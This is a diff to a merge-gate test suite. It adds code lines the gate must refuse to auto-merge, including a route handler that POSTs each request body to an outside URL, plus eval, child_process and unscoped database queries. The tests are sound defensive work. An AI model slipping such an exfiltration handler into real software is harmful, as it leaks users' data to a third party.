@@ -231,6 +231,14 @@ test("what a path cannot say: the approved patch's changed lines and hunk contex
     ["", "const apiKey = read();"], ["", "headers.cookie = value;"],
     // Mail, and markup the browser runs.
     ["", "await sendWelcomeEmail(user);"], ["", "<div dangerouslySetInnerHTML={x} />"],
+    // Review r-20261115-115539-709020: anything leaving by a call of its own, another process, run-time code.
+    ["", 'await fetch("https://example.com/collect", { method: "POST", body: await request.text() });'],
+    ["", "const ws = new WebSocket(url);"], ["", "navigator.sendBeacon(u, b);"], ["", "await axios.post(u, b);"],
+    ["", 'const { exec } = require("child_process");'], ["", "spawn(cmd, args);"], ["", "eval(code);"],
+    ["", "const mod = await import(name);"], ["", "// see https://example.com/docs"],
+    // Data at rest: a query decides whose rows it touches; the file system.
+    ["", "return Response.json(await prisma.conversation.findMany());"], ["", "await tx.project.update({ where: { id }, data });"],
+    ["", 'import { prisma } from "@/lib/prisma";'], ["", "await writeFile(path, body);"],
   ];
   for (const [removed, added] of alarmed) {
     const patch = patchOf("lib/conversationSearch.ts", removed, added);
@@ -307,9 +315,19 @@ test("the app's fresh read holds only while the approved patch still passes, and
     "function noteGrant(access) {\n  return true;\n}\nexport const limit = 12;\n"]]) }),
     { holds: false, reason: "outside_dm_merge_allowlist", paths: ["lib/conversationSearch.ts"] });
   for (const text of ["const row = await tx.memory.findFirst({ where: { id, userId } });", "if (!session) return null;",
-    "const cents = 0;", "process.env.FLAG", "await sendReceiptEmail(x);", "await tx.x.deleteMany({});"]) {
+    "const cents = 0;", "process.env.FLAG", "await sendReceiptEmail(x);", "await tx.x.deleteMany({});",
+    // Review r-20261115-115539-709020, as the reviewer wrote it.
+    'export async function POST(request: Request) { await fetch("https://example.com/collect", { method: "POST", body: await request.text() }); return Response.json({ ok: true }); }',
+    "export async function GET() { return Response.json(await prisma.project.findMany()); }"]) {
     assert.equal(verdict({ files: new Map([...files, ["lib/conversationSearch.ts", text]]) }).holds, false, text);
   }
+  // The reviewed case end to end: a new POST in app/api/projects/route.ts that sends the request body outside.
+  const exfil = 'export async function POST(request: Request) { await fetch("https://example.com/collect", { method: "POST", body: await request.text() }); return Response.json({ ok: true }); }';
+  const route = "app/api/projects/route.ts";
+  assert.equal(qaReleaseDmMergeAllowed(route, [], BLOCK), true, "the path alone would merge");
+  assert.deepEqual(amuxDmT2MergeChangeVerdict({ approved, change: change({ changedFiles: [route] }), scope: BLOCK,
+    patch: patchOf(route, "export {};", exfil), files: new Map([[route, exfil]]) }),
+    { holds: false, reason: "outside_dm_merge_allowlist", paths: [route] });
   // A file not read, gone at the head, or no files at all: a person's.
   assert.deepEqual(verdict({ files: undefined }), { holds: false, reason: "paths_unreadable",
     paths: ["lib/conversationSearch.ts", "app/api/conversations/search/route.ts"] });
